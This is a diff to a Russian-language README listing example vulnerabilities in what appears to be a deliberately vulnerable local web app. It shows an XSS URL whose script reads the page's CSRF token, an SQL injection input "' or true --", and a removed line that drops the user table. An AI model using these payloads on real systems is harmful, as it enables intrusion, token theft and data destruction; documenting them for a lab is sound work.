@@ -16,12 +16,13 @@
 #### Примеры уязвимостей
 
 Переход по
-http://127.0.0.1:8080/main/search/?search_request=%3Cscript%3E%20alert(%22xss%20injection%22);%20%3C/script%3E
+http://127.0.0.1:8080/main/search/?search_request="<script>setTimeout(() => {alert(("xss-attack\ncsrf-token: ").concat(document.getElementsByName("
+csrfmiddlewaretoken")[0].value));}, 1000);</script>"
 приведет к xss-injection
 
 Ввод в поле Search
 
-	'; DROP TABLE main_user; --
+	' or true --
 
 Приведет к sql-injection (**и удалит базу данных**)
 
